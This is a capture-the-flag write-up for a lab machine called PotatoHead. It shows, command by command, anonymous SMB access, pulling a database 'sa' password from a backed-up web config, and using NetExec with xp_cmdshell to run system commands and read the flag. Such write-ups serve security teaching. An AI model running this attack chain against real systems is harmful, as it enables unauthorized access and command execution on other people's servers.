# PotatoHead (user)

Writeup by: solli

## Summary

1. Find the SMB share `Backup`, connect to it without a password
2. Locate the `inetpub.zip` archive, extract it, and retrieve the database credentials
3. Connect to the MSSQL server as the `sa` user and utilize `xp_cmdshell` to execute commands on the machine
4. Read the flag


## Exploit path

### Recon

We begin by scanning the target machine to identify open TCP ports.

```bash
└─$ nmap -v -p- -Pn 10.128.5.11
```
```bash
Discovered open port 3389/tcp on 10.128.5.11
Discovered open port 139/tcp on 10.128.5.11
Discovered open port 445/tcp on 10.128.5.11
Discovered open port 80/tcp on 10.128.5.11
Discovered open port 135/tcp on 10.128.5.11
Discovered open port 49669/tcp on 10.128.5.11
Discovered open port 1433/tcp on 10.128.5.11
```

### Port 445

The SMB service was exposed, potentially with insecure configurations.

Upon checking, we found that anonymous access to the shares is possible.

Listing all shares on the machine revealed that the `Backup` share stands out as an unusual one, as it's not typically present by default.

```bash
└─$ smbclient -N -L 10.128.5.11
```
```bash
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    Backup          Disk      Backup Share
    C$              Disk      Default share
    E$              Disk      Default share
    IPC$            IPC       Remote IPC
```

Visiting the share reveals a file named `inetpub.zip`. Downloading and extracting its contents appears to yield a backup of the inetpub directory on the target machine. This directory likely contains the configuration of the web service running on port 80.

```bash
└─$ smbclient -N //10.128.5.11/backup

Try "help" to get a list of possible commands.
smb: \> dir
  $RECYCLE.BIN                      DHS        0  Mon Aug  4 11:30:22 2025
  inetpub.zip                         A 30882467  Fri Nov  7 12:04:46 2025
  System Volume Information         DHS        0  Tue Aug  5 11:42:00 2025

smb: \> get inetpub.zip
```

Configuration files in this directory often contain authentication mechanisms for the web service to connect to other services. After searching through the files for sensitive information, we find a promising lead:

```bash
└─$ grep -Ri password
inetpub/potatohead/appsettings.json:    "DefaultConnection": "Server=localhost;Database=BeachClubDb;User Id=sa;Password=RLFXT0PpAtk2IAyB1xKnuaFaqDX;TrustServerCertificate=True;"
```

These appear to be database credentials. Given that our Nmap scan revealed the default MSSQL port to be open, it would be a logical next step to try these credentials against the database.

### Port 1443

Connecting to the machine with the credentials we found worked!

```bash
└─$ nxc mssql 10.128.5.11 -u sa -p RLFXT0PpAtk2IAyB1xKnuaFaqDX --local-auth      
MSSQL       10.128.5.11    1433   POTATOHEAD       [*] Windows Server 2022 Build 20348 (name:POTATOHEAD) (domain:PotatoHead)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] POTATOHEAD\sa:RLFXT0PpAtk2IAyB1xKnuaFaqDX (Pwn3d!)
```

Fortunately, we're connecting as the `sa` (system administrator) user, which should grant us administrative rights over the service. Since this account is typically disabled by default, this seems like an opportunity worth exploring.

To confirm that this isn't a red herring, we can verify our permissions. Checking the sysadmin group confirms that we're indeed an administrator.

```bash
└─$ nxc mssql 10.128.5.11 -u sa -p RLFXT0PpAtk2IAyB1xKnuaFaqDX --local-auth -q "SELECT name,type_desc,is_disabled, create_date FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name) = 1;"
MSSQL       10.128.5.11    1433   POTATOHEAD       [*] Windows Server 2022 Build 20348 (name:POTATOHEAD) (domain:PotatoHead)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] POTATOHEAD\sa:RLFXT0PpAtk2IAyB1xKnuaFaqDX (Pwn3d!)
MSSQL       10.128.5.11    1433   POTATOHEAD       name:sa
MSSQL       10.128.5.11    1433   POTATOHEAD       type_desc:SQL_LOGIN
MSSQL       10.128.5.11    1433   POTATOHEAD       is_disabled:0
MSSQL       10.128.5.11    1433   POTATOHEAD       create_date:2003-04-08 09:10:35
```

To execute system-level commands using MSSQL, we can leverage `xp_cmdshell`. However, checking the current setting of this feature indicates that it is currently disabled.

```bash
└─$ nxc mssql 10.128.5.11 -u sa -p RLFXT0PpAtk2IAyB1xKnuaFaqDX --local-auth -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell';" 
MSSQL       10.128.5.11    1433   POTATOHEAD       [*] Windows Server 2022 Build 20348 (name:POTATOHEAD) (domain:PotatoHead)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] POTATOHEAD\sa:RLFXT0PpAtk2IAyB1xKnuaFaqDX (Pwn3d!)
MSSQL       10.128.5.11    1433   POTATOHEAD       name:xp_cmdshell
MSSQL       10.128.5.11    1433   POTATOHEAD       minimum:0
MSSQL       10.128.5.11    1433   POTATOHEAD       maximum:1
MSSQL       10.128.5.11    1433   POTATOHEAD       config_value:0
MSSQL       10.128.5.11    1433   POTATOHEAD       run_value:0
```

We have two options: enable `xp_cmdshell` manually or let `nxc` handle it. By default, `nxc` will restore the original setting after executing commands.
- https://www.netexec.wiki/mssql-protocol/windows-command

Given that the flag is located in the Public folder, we can simply read it using the service account of MSSQL, as we're currently executing with its privileges.

```bash
└─$ nxc mssql 10.128.5.11 -u sa -p RLFXT0PpAtk2IAyB1xKnuaFaqDX --local-auth -x whoami        
MSSQL       10.128.5.11    1433   POTATOHEAD       [*] Windows Server 2022 Build 20348 (name:POTATOHEAD) (domain:PotatoHead)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] POTATOHEAD\sa:RLFXT0PpAtk2IAyB1xKnuaFaqDX (Pwn3d!)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] Executed command via mssqlexec
MSSQL       10.128.5.11    1433   POTATOHEAD       nt service\mssqlserver

└─$ nxc mssql 10.128.5.11 -u sa -p RLFXT0PpAtk2IAyB1xKnuaFaqDX --local-auth -x "type C:\Users\Public\flag.txt"
MSSQL       10.128.5.11    1433   POTATOHEAD       [*] Windows Server 2022 Build 20348 (name:POTATOHEAD) (domain:PotatoHead)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] POTATOHEAD\sa:RLFXT0PpAtk2IAyB1xKnuaFaqDX (Pwn3d!)
MSSQL       10.128.5.11    1433   POTATOHEAD       [+] Executed command via mssqlexec
MSSQL       10.128.5.11    1433   POTATOHEAD       EPT{sei_sandnes_e_stabilt!}
```

Flag: `EPT{sei_sandnes_e_stabilt!}`